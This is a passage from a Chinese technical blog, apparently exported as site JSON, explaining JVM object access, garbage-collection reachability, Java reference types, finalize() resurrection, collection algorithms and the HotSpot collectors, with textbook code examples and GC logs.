介绍完Java虚拟机的运行时数据区之后，我们就可以来探讨一个问题：在Java语言中，对象访问是如何进行的？对象访问在Java语言中无处不在，是最普通的程序行为，但即使是最简单的访问，也会却涉及Java栈、Java堆、方法区这三个最重要内存区域之间的关联关系，如下面的这句代码：Objectobj=newObject();假设这句代码出现在方法体中，那“Objectobj”这部分的语义将会反映到Java栈的本地变量表中，作为一个reference类型数据出现。而“newObject()”这部分的语义将会反映到Java堆中，形成一块存储了Object类型所有实例数据值（InstanceData，对象中各个实例字段的数据）的结构化内存，根据具体类型以及虚拟机实现的对象内存布局（ObjectMemoryLayout）的不同，这块内存的长度是不固定的。另外，在Java堆中还必须包含能查找到此对象类型数据（如对象类型、父类、实现的接口、方法等）的地址信息，这些类型数据则存储在方法区中。由于reference类型在Java虚拟机规范里面只规定了一个指向对象的引用，并没有定义这个引用应该通过哪种方式去定位，以及访问到Java堆中的对象的具体位置，因此不同虚拟机实现的对象访问方式会有所不同，主流的访问方式有两种：使用句柄和直接指针。 如果使用句柄访问方式，Java堆中将会划分出一块内存来作为句柄池，reference中存储的就是对象的句柄地址，而句柄中包含了对象实例数据和类型数据各自的具体地址信息，如图: ![这里写图片描述](http://img.blog.csdn.net/20170728094239784?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY253dWhhbw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast) 如果使用直接指针访问方式，Java堆对象的布局中就必须考虑如何放置访问类型数据的相关信息，reference中直接存储的就是对象地址，如图:``![这里写图片描述](http://img.blog.csdn.net/20170728094300056?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY253dWhhbw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast) 这两种对象的访问方式各有优势，使用句柄访问方式的最大好处就是reference中存储的是稳定的句柄地址，在对象被移动（垃圾收集时移动对象是非常普遍的行为）时只会改变句柄中的实例数据指针，而reference本身不需要被修改。使用直接指针访问方式的最大好处就是速度更快，它节省了一次指针定位的时间开销，由于对象的访问在Java中非常频繁，因此这类开销积少成多后也是一项非常可观的执行成本。就本书讨论的主要虚拟机SunHotSpot而言，它是使用第二种方式进行对象访问的，但从整个软件开发的范围来看，各种语言和框架使用句柄来访问的情况也十分常见。 参照： 深入理解Java虚拟机 http://blog.csdn.net/u012152619/article/details/46968883 http://www.importnew.com/14630.html","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://wuhaocn.github.io/tags/JVM/"}]},{"title":"JVM垃圾回收","slug":"language/jvm/JVM垃圾回收","date":"2021-08-04T06:25:13.662Z","updated":"2021-08-04T06:25:13.663Z","comments":true,"path":"2021/08/04/language/jvm/JVM垃圾回收/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/language/jvm/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/","excerpt":"","text":"JVM垃圾回收1.简介 jvm要进行垃圾回收粗略分为两个步骤：找出需要清理的内存(无效的内存区域) ， 清理无效的内存区域 程序计数器、虚拟机栈、本地方法栈三个区域随线程而生，随线程而灭；栈中的栈帧随着方法的进入和退出而有条不紊地执行着出栈和入栈操作。每一个栈帧中分配多少内存基本上是在类结构确定下来时就已知的（尽管在运行期会由JIT编译器进行一些优化，但在本章基于概念模型的讨论中，大体上可以认为是编译期可知的），因此这几个区域的内存分配和回收都具备确定性，在这几个区域内不需要过多考虑回收的问题，因为方法结束或线程结束时，内存自然就跟随着回收了。而Java堆和方法区则不一样，一个接口中的多个实现类需要的内存可能不一样，一个方法中的多个分支需要的内存也可能不一样，我们只有在程序处于运行期间时才能知道会创建哪些对象，这部分内存的分配和回收都是动态的，垃圾回收所关注的是这部分内存。 2. 无效内存区域的查找2.1 概要Java堆中几乎存放着Java世界中所有的对象实例，垃圾收集器在对堆进行回收前，第一件事情就是要确定这些对象有哪些还“存活”着，哪些已经“死去”。判断方法有引用计数器法和根搜索算法等。 2.1.1 引用计数算法简单解释为给对象中添加一个引用计数器，每当有一个地方引用它时，计数器值就加1；当该引用失效时，计数器值就减1；任何时刻计数器都为0的对象就是不可能再被使用的。客观地说，引用计数算法（ReferenceCounting）的实现简单，判定效率也很高，在大部分情况下它都是一个不错的算法，也有一些比较著名的应用案例，例如微软的COM（ComponentObjectModel）技术、使用ActionScript3的FlashPlayer、Python语言以及在游戏脚本领域中被广泛应用的Squirrel中都使用了引用计数算法进行内存管理。但Java语言中没有选用引用计数算法来管理内存，其中最主要的原因是它很难解决对象之间的相互循环引用的问题。如下： 1234567891011121314151617181920212223/** *testGC()方法执行后，objA和objB会不会被GC呢？ *@authorzzm */public class ReferenceCountingGC&#123; public Object instance=null; private static final int _1MB=1024*1024; /** *这个成员属性的唯一意义就是占点内存，以便能在GC日志中看清楚是否被回收过 */ private byte[] bigSize=new byte[2*_1MB]; public static void testGC()&#123; ReferenceCountingGC objA = new ReferenceCountingGC(); ReferenceCountingGC objB = newReferenceCountingGC(); objA.instance = objB; objB.instance = objA; objA = null; objB = null; //假设在这行发生GC，那么objA和objB是否能被回收？ System.gc(); &#125;&#125;运行结果： 1234567891011121314[FullGC(System)[Tenured:0K-&gt;210K(10240K),0.0149142secs]4603K-&gt;210K(19456K),[Perm:2999K-&gt;2999K(21248K)],0.0150007secs][Times:user=0.01sys=0.00,real=0.02secs]Heapdefnewgenerationtotal9216K,used82K[0x00000000055e0000,0x0000000005fe0000,0x0000000005fe0000)Edenspace8192K,1%used[0x00000000055e0000,0x00000000055f4850,0x0000000005de0000)fromspace1024K,0%used[0x0000000005de0000,0x0000000005de0000,0x0000000005ee0000)tospace1024K,0%used[0x0000000005ee0000,0x0000000005ee0000,0x0000000005fe0000)tenuredgenerationtotal10240K,used210K[0x0000000005fe0000,0x00000000069e0000,0x00000000069e0000)thespace10240K,2%used[0x0000000005fe0000,0x0000000006014a18,0x0000000006014c00,0x00000000069e0000)compactingpermgentotal21248K,used3016K[0x00000000069e0000,0x0000000007ea0000,0x000000000bde0000)thespace21248K,14%used[0x00000000069e0000,0x0000000006cd2398,0x0000000006cd2400,0x0000000007ea0000)Nosharedspacesconfigured. 代码中testGC()方法：对象objA和objB都有字段instance，赋值令objA.instance=objB及objB.instance=objA，除此之外，这两个对象再无任何引用，实际上这两个对象已经不可能再被访问，但是它们因为互相引用着对方，导致它们的引用计数都不为0，于是引用计数算法无法通知GC收集器回收它们，为引用计数器的缺陷。但从运行结果中可以清楚地看到GC日志中包含“4603K-&gt;210K”，意味着虚拟机并没有因为这两个对象互相引用就不回收它们，这也从侧面说明虚拟机并不是通过引用计数算法来判断对象是否存活的。 2.1.2 根搜索算法在主流的商用程序语言中（Java和C#，甚至包括前面提到的古老的Lisp），都是使用根搜索算法（GCRootsTracing）判定对象是否存活的。这个算法的基本思路就是通过一系列的名为“GCRoots”的对象作为起始点，从这些节点开始向下搜索，搜索所走过的路径称为引用链（ReferenceChain），当一个对象到GCRoots没有任何引用链相连（用图论的话来说就是从GCRoots到这个对象不可达）时，则证明此对象是不可用的。如下： 对象object5、object6、object7虽然互相有关联，但是它们到GCRoots是不可达的，所以它们将会被判定为是可回收的对象。在Java语言里，可作为GCRoots的对象包括下面几种： 虚拟机栈（栈帧中的本地变量表）中的引用的对象。 方法区中的类静态属性引用的对象。 方法区中的常量引用的对象。 本地方法栈中JNI（即一般说的Native方法）的引用的对象。 2.2 java的引用类型无论是通过引用计数算法判断对象的引用数量，还是通过根搜索算法判断对象的引用链是否可达，判定对象是否存活都与“引用”有关。在JDK1.2之前，Java中的引用的定义很传统：如果reference类型的数据中存储的数值代表的是另外一块内存的起始地址，就称这块内存代表着一个引用。这种定义很纯粹，但是太过狭隘，一个对象在这种定义下只有被引用或者没有被引用两种状态，对于如何描述一些“食之无味，弃之可惜”的对象就显得无能为力。我们希望能描述这样一类对象：当内存空间还足够时，则能保留在内存之中；如果内存在进行垃圾收集后还是非常紧张，则可以抛弃这些对象。很多系统的缓存功能都符合这样的应用场景。JDK1.2之后，Java对引用的概念进行了扩充，并且引用强度不同。如下 引用类型 概述 强引用（StrongReference） 强引用就是指在程序代码之中普遍存在的，类似“Objectobj=newObject()”这类的引用，只要强引用还存在，垃圾收集器永远不会回收掉被引用的对象 软引用（SoftReference） 软引用用来描述一些还有用，但并非必需的对象。对于软引用关联着的对象，在系统将要发生内存溢出异常之前，将会把这些对象列进回收范围之中并进行第二次回收。如果这次回收还是没有足够的内存，才会抛出内存溢出异常。在JDK1.2之后，提供了SoftReference类来实现软引用 弱引用（WeakReference） 弱引用也是用来描述非必需对象的，但是它的强度比软引用更弱一些，被弱引用关联的对象只能生存到下一次垃圾收集发生之前。当垃圾收集器工作时，无论当前内存是否足够，都会回收掉只被弱引用关联的对象。在JDK1.2之后，提供了WeakReference类来实现弱引用 虚引用（PhantomReference） 虚引用也称为幽灵引用或者幻影引用，它是最弱的一种引用关系。一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用来取得一个对象实例。为一个对象设置虚引用关联的唯一目的就是希望能在这个对象被收集器回收时收到一个系统通知。在JDK1.2之后，提供了PhantomReference类来实现虚引用 2.3 对象自救在根搜索算法中不可达的对象，也并非是“非死不可”的，这时候它们暂时处于“缓刑”阶段，要真正宣告一个对象死亡，至少要经经历两次标记过程：如果对象在进行根搜索后发现没有与GCRoots相连接的引用链，那它将会被第一次标记并且进行一次筛选，筛选的条件是此对象是否有必要执行finalize()方法。当对象没有覆盖finalize()方法，或者finalize()方法已经被虚拟机调用过，虚拟机将这两种情况都视为“没有必要执行”。如果这个对象被判定为有必要执行finalize()方法，那么这个对象将会被放置在一个名为F-Queue的队列之中，并在稍后由一条由虚拟机自动建立的、低优先级的Finalizer线程去执行。这里所谓的“执行”是指虚拟机会触发这个方法，但并不承诺会等待它运行结束。这样做的原因是，如果一个对象在finalize()方法中执行缓慢，或者发生了死循环（更极端的情况），将很可能会导致F-Queue队列中的其他对象永久处于等待状态，甚至导致整个内存回收系统崩溃。finalize()方法是对象逃脱死亡命运的最后一次机会，稍后GC将对F-Queue中的对象进行第二次小规模的标记，如果对象要在finalize()中成功拯救自己——只要重新与引用链上的任何一个对象建立关联即可，譬如把自己（this关键字）赋值给某个类变量或对象的成员变量，那在第二次标记时它将被移除出“即将回收”的集合；如果对象这时候还没有逃脱，那它就真的离死不远了。 123456789101112131415161718192021222324252627282930313233343536/***此代码演示了两点： *1.对象可以在被GC时自我拯救。 *2.这种自救的机会只有一次，因为一个对象的finalize()方法最多只会被系统自动调用一次 *@authorzzm * */public class FinalizeEscapeGC &#123; public static FinalizeEscapeGC SAVE_HOOK = null; public static void main(String[] args) throws Throwable &#123; SAVE_HOOK = new FinalizeEscapeGC(); //对象 第一次 成功 拯救 自己 SAVE_HOOK = null; System.gc(); // 因为 Finalizer 方法 优先级 很低， 暂停 0. 5 秒， 以 等待 它 Thread.sleep(500); if (SAVE_HOOK != null) &#123; SAVE_HOOK.isAlive(); &#125; else &#123; System.out.println(&quot; no, i am dead :(&quot;); &#125; // 下面 这段 代码 与 上面 的 完全 相同， 但是 这次 自救 却 失败 了 SAVE_HOOK = null; System.gc(); // 因为 Finalizer 方法 优先级 很低， 暂停 0. 5 秒， 以 等待 它 Thread.sleep(500); if (SAVE_HOOK != null) &#123; SAVE_HOOK.isAlive(); &#125; else &#123; System.out.println(&quot; no, i am dead :(&quot;); &#125; &#125; public void isAlive() &#123; System.out.println(&quot; yes, i am still alive :)&quot;); &#125; @Override protected void finalize() throws Throwable &#123; super.finalize(); System.out.println(&quot; finalize mehtod executed!&quot;); FinalizeEscapeGC.SAVE_HOOK = this; &#125;&#125; 1234运行结果：finalize mehtod executed! yes, i am still alive :) no, i am dead :( 从代码中我们可以看到一个对象的finalize()被执行，但是它仍然可以存活。代码中一次对象自我拯救的演示，在运行结果可以看到，SAVE_HOOK对象的finalize()方法确实被GC收集器触发过，并且在被收集前成功逃脱了。另外一个值得注意的地方就是，代码中有两段完全一样的代码片段，执行结果却是一次逃脱成功，一次失败，这是因为任何一个对象的finalize()方法都只会被系统自动调用一次，如果对象面临下一次回收，它的finalize()方法不会被再次执行，因此第二段代码的自救行动失败了。需要特别说明的是，上面关于对象死亡时finalize()方法的描述可能带有悲情的艺术色彩，笔者并不鼓励大家使用这种方法来拯救对象。相反，笔者建议大家尽量避免使用它，因为它不是C/C++中的析构函数，而是Java刚诞生时为了使C/C++程序员更容易接受它所做出的一个妥协。它的运行代价高昂，不确定性大，无法保证各个对象的调用顺序。有些教材中提到它适合做“关闭外部资源”之类的工作，这完全是对这种方法的用途的一种自我安慰。finalize()能做的所有工作，使用try-finally或其他方式都可以做得更好、更及时，大家完全可以忘掉Java语言中还有这个方法的存在。 2.4 回收方法区很多人认为方法区（或者HotSpot虚拟机中的永久代）是没有垃圾收集的，Java虚拟机规范中确实说过可以不要求虚拟机在方法区实现垃圾收集，而且在方法区进行垃圾收集的“性价比”一般比较低：在堆中，尤其是在新生代中，常规应用进行一次垃圾收集一般可以回收70%~95%的空间，而永久代的垃圾收集效率远低于此。永久代的垃圾收集主要回收两部分内容：废弃常量和无用的类。回收废弃常量与回收Java堆中的对象非常类似。以常量池中字面量的回收为例，假如一个字符串“abc”已经进入了常量池中，但是当前系统没有任何一个String对象是叫做“abc”的，换句话说是没有任何String对象引用常量池中的“abc”常量，也没有其他地方引用了这个字面量，如果在这时候发生内存回收，而且必要的话，这个“abc”常量就会被系统“请”出常量池。常量池中的其他类（接口）、方法、字段的符号引用也与此类似。判定一个常量是否是“废弃常量”比较简单，而要判定一个类是否是“无用的类”的条件则相对苛刻许多。java中同时满足下面3个条件才能算是“无用的类”： 该类所有的实例都已经被回收，也就是Java堆中不存在该类的任何实例。 加载该类的ClassLoader已经被回收。 该类对应的java.lang.Class对象没有在任何地方被引用，无法在任何地方通过反射访问该类的方法。 虚拟机可以对满足上述3个条件的无用类进行回收，这里说的仅仅是“可以”，而不是和对象一样，不使用了就必然会回收。是否对类进行回收，HotSpot虚拟机提供了-Xnoclassgc参数进行控制。可以使用-verbose：class及-XX：+TraceClassLoading、-XX：+TraceClassUnLoading查看类的加载和卸载信息，其中-verbose：class和-XX：+TraceClassLoading可以在Product版的虚拟机中使用，但-XX：+TraceClassLoading参数需要fastdebug版的虚拟机支持。在大量使用反射、动态代理、CGLib等bytecode框架的场景，以及动态生成JSP和OSGi这类频繁自定义ClassLoader的场景都需要虚拟机具备类卸载的功能，以保证永久代不会溢出。 3. 清理无效内存3.1 垃圾收集算法由于垃圾收集算法的实现涉及大量的程序细节，而且各个平台的虚拟机操作内存的方法又各不相同，因此本节不打算过多地讨论算法的实现，只是介绍几种算法的思想及其发展过程。 3.1.1 标记-清除算法最基础的收集算法是“标记-清除”（Mark-Sweep）算法，如它的名字一样，算法分为“标记”和“清除”两个阶段：首先标记出所有需要回收的对象，在标记完成后统一回收掉所有被标记的对象，它的标记过程其实在前一节讲述对象标记判定时已经基本介绍过了。之所以说它是最基础的收集算法，是因为后续的收集算法都是基于这种思路并对其缺点进行改进而得到的。它的主要缺点有两个： 一个是效率问题，标记和清除过程的效率都不高； 一个是空间问题，标记清除之后会产生大量不连续的内存碎片，空间碎片太多可能会导致，当程序在以后的运行过程中需要分配较大对象时无法找到足够的连续内存而不得不提前触发另一次垃圾收集动作。如下图为执行标记清除算法后的内存区域： 3.1.2 标记-整理算法标记操作和“标记-清除”算法一致，后续操作不只是直接清理对象，而是在清理无用对象完成后让所有存活的对象都向一端移动，并更新引用其对象的指针。主要缺点：在标记-清除的基础上还需进行对象的移动，成本相对较高，好处则是不会产生内存碎片。如下图为执行标记清除算法后的内存区域： ####3.1.3 复制算法 为了解决效率问题，一种称为“复制”（Copying）的收集算法出现了，它将可用内存按容量划分为大小相等的两块，每次只使用其中的一块。当这一块的内存用完了，就将还存活着的对象复制到另外一块上面，然后再把已使用过的内存空间一次清理掉。这样使得每次都是对其中的一块进行内存回收，内存分配时也就不用考虑内存碎片等复杂情况，只要移动堆顶指针，按顺序分配内存即可，实现简单，运行高效。只是这种算法的代价是将内存缩小为原来的一半，未免太高了一点。复制算法执行后的内存区域： 3.1.4 分代收集算法分代收集算法当前商业虚拟机的垃圾收集都采用“分代收集”（GenerationalCollection）算法，这种算法并没有什么新的思想，只是根据对象的存活周期的不同将内存划分为几块。一般是把Java堆分为新生代和老年代，这样就可以根据各个年代的特点采用最适当的收集算法。在新生代中，每次垃圾收集时都发现有大批对象死去，只有少量存活，那就选用复制算法，只需要付出少量存活对象的复制成本就可以完成收集。而老年代中因为对象存活率高、没有额外空间对它进行分配担保，就必须使用“标记-清理”或“标记-整理”算法来进行回收。 3.2 垃圾收集器垃圾收集器对比 垃圾收集器 解释 对比 Serial收集器 新生代复制算法，老年代采用标记整理算法，Serial收集器到JDK1.7为止，它依然是JAVA虚拟机运行在Client模式下的默认新生代收集器。 它也有着优于其他收集器的地方：简单而高效（与其他收集器的单线程比），对于限定单个CPU的环境来说，Serial收集器由于没有线程交互的开销，专心做垃圾收集自然可以获得最高的单线程收集效率 ParNew收集器 新生代复制算法，老年代采用标记整理算法，ParNew收集器其实就是Serial收集器的多线程版本 ParNew收集器在单CPU的环境中绝对不会有比Serial收集器更好的效果，甚至由于存在线程交互的开销，该收集器在通过超线程技术实现的两个CPU的环境中都不能百分之百地保证能超越Serial收集器。当然，随着可以使用的CPU的数量的增加，它对于GC时系统资源的利用还是很有好处的。它默认开启的收集线程数与CPU的数量相同，在CPU非常多，可以使用-XX:ParallelGCThreads参数来限制垃圾收集的线程数。 ParallelScavenge收集器 新生代收集器采用复制算法 Parallel Scavenge 收集 器 的 特点 是它 的 关注 点 与其 他 收集 器 不同， CMS 等 收集 器 的 关注 点 尽可能 地 缩短 垃圾 收集 时 用户 线程 的 停顿 时间， 而 Parallel Scavenge 收集 器 的 目标 则是 达到 一个 可 控制 的 吞吐量（ Throughput）。 Serial Old 收集 器 Serial Old 是 Serial 收集 器 的 老年 代 版本 标记-整理算法 这个 收集 器 的 主要 意义 也是 被 Client 模式 下 的 虚拟 机 使用 Parallel Old 收集 器 Parallel Scavenge 收集 器 的 老年 代 版本 标记-整理算法 注重 吞吐量 及 CPU 资源 敏感 的 场合， 都可以 优先 考虑 Parallel Scavenge 加 Parallel Old 收集 器。 CMS收集器 CMS（ConcurrentMarkSweep）针对老年代进行回收的GC，标记-清除算法 收集器是一种以获取最短回收停顿时间为目标的收集器 G1收集器 内存结构变更，相对于CMS的“标记——清理”算法，G1会使用压缩算法，保证不产生多余的碎片。收集阶段，G1会将某个区域存活的对象拷贝的其他区域，然后将整个区域整个回收。 服务类型的收集器，目标是多处理器机器、大内存机器。它高度符合垃圾收集暂停时间的目标，同时实现高吞吐量。Oracle JDK 7 update 4 以及更新发布版完全支持G1垃圾收集器。 并行（Parallel）：指多条垃圾收集线程并行工作，但此时用户线程仍然处于等待状态。并发（Concurrent）：指用户线程与垃圾收集线程同时执行（但不一定是并行的，可能会交替执行），用户程序继续运行，而垃圾收集程序运行于另一个CPU上。如果说收集算法是内存回收的方法论，垃圾收集器就是内存回收的具体实现。Java虚拟机规范中对垃圾收集器应该如何实现并没有任何规定，因此不同的厂商、不同版本的虚拟机所提供的垃圾收集器都可能会有很大的差别，并且一般都会提供参数供用户根据自己的应用特点和要求组合出各个年代所使用的收集器。这里讨论的收集器基于SunHotSpot虚拟机1.6版Update22，这个虚拟机包含的所有收集器如图所示。 HotSpotJVM1.6的垃圾收集器展示了7种作用于不同分代的收集器（包括JDK1.6_Update14后引入的EarlyAccess版G1收集器），如果两个收集器之间存在连线，就说明它们可以搭配使用。在介绍这些收集器各自的特性之前，我们先来明确一个观点：虽然我们是在对各个收集器进行比较，但并非为了挑选一个最好的收集器出来。因为直到现在为止还没有最好的收集器出现，更加没有万能的收集器，所以我们选择的只是对具体应用最合适的收集器。这点不需要多加解释就能证明：如果有一种放之四海皆准、任何场景下都适用的完美收集器存在，那HotSpot虚拟机就没必要实现那么多不同的收集器了。####3.2.1 Serial收集器 Serial收集器是最基本、发展历史最悠久的收集器，曾经（在JDK 1.3.1之前）是虚拟机新生代收集的唯一选择。大家看名字就会知道，这个收集器是一个单线程的收集器，但它的“单线程”的意义并不仅仅说明它只会使用一个CPU或一条收集线程去完成垃圾收集工作，更重要的是在它进行垃圾收集时，必须暂停其他所有的工作线程，直到它收集结束。“Stop The World”这个名字也许听起来很酷，但这项工作实际上是由虚拟机在后台自动发起和自动完成的，在用户不可见的情况下把用户正常工作的线程全部停掉，这对很多应用来说都是难以接受的。读者不妨试想一下，要是你的计算机每运行一个小时就会暂停响应5分钟，你会有什么样的心情？Serial / Serial Old收集器的运行过程如下： 从 JDK 1.3 开始，一直到现在最新的 JDK 1.7，HotSpot 虚拟机开发团队为消除或者减少工作线程因内存回收而导致停顿的努力一直在进行着，从 Serial 收集器到 Parallel 收集器，再到 Concurrent Mark Sweep（CMS）乃至 GC 收集器的最前沿成果 Garbage First（G1）收集器，我们看到了一个个越来越优秀（也越来越复杂）的收集器的出现，用户线程的停顿时间在不断缩短，但是仍然没有办法完全消除（这里暂不包括 RTSJ 中的收集器）。寻找更优秀的垃圾收集器的工作仍在继续！ 写到这里，笔者似乎已经把 Serial 收集器描述成一个“老而无用、食之无味弃之可惜”的鸡肋了，但实际上到现在为止，它依然是虚拟机运行在 Client 模式下的默认新生代收集器。它也有着优于其他收集器的地方：简单而高效（与其他收集器的单线程比），对于限定单个 CPU 的环境来说，Serial 收集器由于没有线程交互的开销，专心做垃圾收集自然可以获得最高的单线程收集效率。在用户的桌面应用场景中，分配给虚拟机管理的内存一般来说不会很大，收集几十兆甚至一两百兆的新生代（仅仅是新生代使用的内存，桌面应用基本上不会再大了），停顿时间完全可以控制在几十毫秒最多一百多毫秒以内，只要不是频繁发生，这点停顿是可以接受的。所以，Serial 收集器对于运行在 Client 模式下的虚拟机来说是一个很好的选择。 3.2.2 ParNew收集器ParNew收集器其实就是Serial收集器的多线程版本，除了使用多条线程进行垃圾收集之外，其余行为包括Serial收集器可用的所有控制参数（例如：-XX:SurvivorRatio、 -XX:PretenureSizeThreshold、-XX:HandlePromotionFailure等）、收集算法、Stop The World、对象分配规则、回收策略等都与Serial收集器完全一样，实现上这两种收集器也共用了相当多的代码。ParNew收集器的工作过程如下 ParNew收集器除了多线程收集之外，其他与Serial收集器相比并没有太多创新之处，但它却是许多运行在Server模式下的虚拟机中首选的新生代收集器，其中有一个与性能无关但很重要的原因是，除了Serial收集器外，目前只有它能与CMS收集器配合工作。在JDK 1.5时期，HotSpot推出了一款在强交互应用中几乎可称为有划时代意义的垃圾收集器—CMS收集器（Concurrent Mark Sweep，本节稍后将详细介绍这款收集器），这款收集器是HotSpot虚拟机中第一款真正意义上的并发（Concurrent）收集器，它第一次实现了让垃圾收集线程与用户线程（基本上）同时工作，用前面那个例子的话来说，就是做到了在你妈妈打扫房间的时候你还能同时往地上扔纸屑。 不幸的是，它作为老年代的收集器，却无法与 JDK 1.4.0 中已经存在的新生代收集器 Parallel Scavenge 配合工作，所以在 JDK 1.5 中使用 CMS 来收集老年代的时候，新生代只能选择 ParNew 或 Serial 收集器中的一个。ParNew 收集器也是使用 -XX: +UseConcMarkSweepGC 选项后的默认新生代收集器，也可以使用 -XX:+UseParNewGC 选项来强制指定它。 ParNew 收集器在单 CPU 的环境中绝对不会有比 Serial 收集器更好的效果，甚至由于存在线程交互的开销，该收集器在通过超线程技术实现的两个 CPU 的环境中都不能百分之百地保证能超越 Serial 收集器。当然，随着可以使用的 CPU 的数量的增加，它对于 GC 时系统资源的利用还是很有好处的。它默认开启的收集线程数与 CPU 的数量相同，在 CPU 非常多（譬如 32 个，现在 CPU 动辄就 4 核加超线程，服务器超过 32 个逻辑 CPU 的情况越来越多了）的环境下，可以使用-XX:ParallelGCThreads 参数来限制垃圾收集的线程数。 注意 从 ParNew 收集器开始，后面还将会接触到几款并发和并行的收集器。在大家可能产生疑惑之前，有必要先解释两个名词：并发和并行。这两个名词都是并发编程中的概念，在谈论垃圾收集器的上下文语境中，他们可以解释为： 并行（Parallel）：指多条垃圾收集线程并行工作，但此时用户线程仍然处于等待状态。 并发（Concurrent）：指用户线程与垃圾收集线程同时执行（但不一定是并行的，可能会交替执行），用户程序继续运行，而垃圾收集程序运行于另一个 CPU 上。 3.2.3 ParallelScavenge收集器Parallel Scavenge收集器是一个新生代收集器，它也是使用复制算法的收集器，又是并行的多线程收集器……看上去和ParNew都一样，那它有什么特别之处呢？ Parallel Scavenge 收集器的特点是它的关注点与其他收集器不同，CMS 等收集器的关注点是尽可能地缩短垃圾收集时用户线程的停顿时间，而 Parallel Scavenge 收集器的目标则是达到一个可控制的吞吐量（Throughput）。所谓吞吐量就是 CPU 用于运行用户代码的时间与 CPU 总消耗时间的比值，即吞吐量 = 运行用户代码时间 /（运行用户代码时间 + 垃圾收集时间），虚拟机总共运行了 100 分钟，其中垃圾收集花掉 1 分钟，那吞吐量就是 99%。 停顿时间越短就越适合需要与用户交互的程序，良好的响应速度能提升用户体验，而高吞吐量则可以高效率地利用 CPU 时间，尽快完成程序的运算任务，主要适合在后台运算而不需要太多交互的任务。 Parallel Scavenge 收集器提供了两个参数用于精确控制吞吐量，分别是控制最大垃圾收集停顿时间的-XX:MaxGCPauseMillis 参数以及直接设置吞吐量大小的-XX:GCTimeRatio 参数。 MaxGCPauseMillis 参数允许的值是一个大于 0 的毫秒数，收集器将尽可能地保证内存回收花费的时间不超过设定值。不过大家不要认为如果把这个参数的值设置得稍小一点就能使得系统的垃圾收集速度变得更快，GC 停顿时间缩短是以牺牲吞吐量和新生代空间来换取的：系统把新生代调小一些，收集 300MB 新生代肯定比收集 500MB 快吧，这也直接导致垃圾收集发生得更频繁一些，原来 10 秒收集一次、每次停顿 100 毫秒，现在变成 5 秒收集一次、每次停顿 70 毫秒。停顿时间的确在下降，但吞吐量也降下来了。 GCTimeRatio 参数的值应当是一个大于 0 且小于 100 的整数，也就是垃圾收集时间占总时间的比率，相当于是吞吐量的倒数。如果把此参数设置为 19，那允许的最大 GC 时间就占总时间的 5%（即 1 /（1+19）），默认值为 99，就是允许最大 1%（即 1 /（1+99））的垃圾收集时间。 由于与吞吐量关系密切，Parallel Scavenge 收集器也经常称为“吞吐量优先”收集器。除上述两个参数之外，Parallel Scavenge 收集器还有一个参数-XX:+UseAdaptiveSizePolicy 值得关注。这是一个开关参数，当这个参数打开之后，就不需要手工指定新生代的大小（-Xmn）、Eden 与 Survivor 区的比例（-XX:SurvivorRatio）、晋升老年代对象年龄（-XX:PretenureSizeThreshold）等细节参数了，虚拟机会根据当前系统的运行情况收集性能监控信息，动态调整这些参数以提供最合适的停顿时间或者最大的吞吐量，这种调节方式称为 GC 自适应的调节策略（GC Ergonomics）。如果读者对于收集器运作原来不太了解，手工优化存在困难的时候，使用 Parallel Scavenge 收集器配合自适应调节策略，把内存管理的调优任务交给虚拟机去完成将是一个不错的选择。只需要把基本的内存数据设置好（如-Xmx 设置最大堆），然后使用 MaxGCPauseMillis 参数（更关注最大停顿时间）或 GCTimeRatio（更关注吞吐量）参数给虚拟机设立一个优化目标，那具体细节参数的调节工作就由虚拟机完成了。自适应调节策略也是 Parallel Scavenge 收集器与 ParNew 收集器的一个重要区别。 ####3.2.4 Serial Old 收集 器 Serial Old 是 Serial 收集 器 的 老年 代 版本， 它 同样是 一个 单线 程 收集 器， 使用“ 标记- 整理” 算法。 这个 收集 器 的 主要 意义 也是 被 Client 模式 下 的 虚拟 机 使用。 如果 在 Server 模式 下， 它 主要 还有 两大 用途： 一个 是在 JDK 1. 5 及 之前 的 版本 中 与 Parallel Scavenge 收集 器 搭配 使用[ 4]， 另外 一个 就是 作为 CMS 收集 器 的 后备 预 案， 在 并发 收集 发生 Concurrent Mode Failure 的 时候 使用。 这 两点 都将 在后 面的 内容 中 详细 讲解。 Serial Old 收集 器 的 工作 过程 如图 所示。 ####3.2.5 Parallel Old 收集 器 Parallel Old 是 Parallel Scavenge 收集 器 的 老年 代 版本， 使用 多 线程 和“ 标记－整理” 算法。 这个 收集 器 是在 JDK 1. 6 中 才 开始 提供 的， 在此之前， 新生代 的 Parallel Scavenge 收集 器 一直 处于 比较 尴尬 的 状态。 原因 是， 如果 新生代 选择 了 Parallel Scavenge 收集 器， 老年 代 除了 Serial Old（ PS MarkSweep） 收集 器 外 别无选择（ 还 记得 上面 说过 Parallel Scavenge 收集 器 无法 与 CMS 收集 器 配合 工作 吗？）。 由于 单 线程 的 老 年代 Serial Old 收集 器 在 服务 端 应用 性 能上 的“ 拖累”， 即便 使用 了 Parallel Scavenge 收集 器 也 未必 能在 整体 应用 上 获得 吞吐量 最大化 的 效果， 又因 为 老年 代收 集中 无法 充分 利用 服务器 多 CPU 的 处理 能力， 在 老年 代 很大 而且 硬件 比较 高级的 环境 中， 这种 组合 的 吞吐量 甚至 还不 一 定有 ParNew 加 CMS 的 组合“ 给 力”。 直到 Parallel Old 收集 器 出现 后，“ 吞吐量 优先” 收集 器 终于 有了 比较 名副其实 的 应用 组合， 在 注重 吞吐量 及 CPU 资源 敏感 的 场合， 都可以 优先 考虑 Parallel Scavenge 加 Parallel Old 收集 器。 Parallel Old 收集 器 的 工作 过程 如图所示。 3.2.6 